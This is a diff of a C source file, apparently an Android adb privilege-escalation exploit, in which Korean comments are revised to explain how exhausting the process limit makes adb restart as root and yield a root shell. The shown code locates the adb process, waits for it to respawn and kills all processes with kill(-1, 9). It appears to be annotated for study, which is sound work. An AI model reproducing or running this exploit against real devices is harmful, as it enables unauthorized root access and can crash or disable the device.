@@ -8,10 +8,6 @@
  * If you run it, it might crash your device and make it unusable!
  * So you use it at your own risk!
  */
-/*
- * adb 프로세스를 fork() 리미트가 있을 때, 포크가 실패하는 –1을 리턴할 때, uid가 0인 adb 리셋이 만들어지고, 
- * 이런 환경에서 루트쉘이 뜨기 때문에 취약합니다.
-*/
 #include <stdio.h>
 #include <sys/types.h>
 #include <sys/time.h>
@@ -45,12 +41,12 @@ pid_t find_adb()
 		memset(buf, 0, sizeof(buf));
 		read(fd, buf, sizeof(buf) - 1);
 		close(fd);
-		if (strstr(buf, "/sbin/adb")) {
+		if (strstr(buf, "/sbin/adb")) { // /sbin/adb 프로세스 색인되면 pid를 found에 설정.
 			found = i;
 			break;
 		}
         }
-        return found;
+        return found; // /sbin/adb 프로세스 ID 반환.
 }
 
 
@@ -67,13 +63,13 @@ void wait_for_root_adb(pid_t old_adb)
 	pid_t p = 0;
 
 	for (;;) {
-		p = find_adb(); // old_adb가 pid가 0이 아니면 코드 브레이크해서 adb 리셋하고 루트쉘이 뜨도록 함.
-		if (p != 0 && p != old_adb)
+		p = find_adb(); // /sbin/adb 프로세스 ID 찾고,
+		if (p != 0 && p != old_adb) // 찾은 프로세스 ID가 old_adb이면 브레이크.
 			break;
 		sleep(1);
 	}
 	sleep(5);
-	kill(-1, 9);
+	kill(-1, 9); // 모든 프로세스 킬.
 }
 
 
@@ -170,7 +166,7 @@ int main(int argc, char **argv)
 			sleep(0x743C);
 	}
 
-	// 자식 프로세스 일 때, adb리셋으로 루트쉘 뜨므로 획득.
+	// 자식 프로세스 일 때, adb리셋으로 루트쉘 뜨므로 대기 후 획득.
 	wait_for_root_adb(adb_pid);
 	return 0;
 }
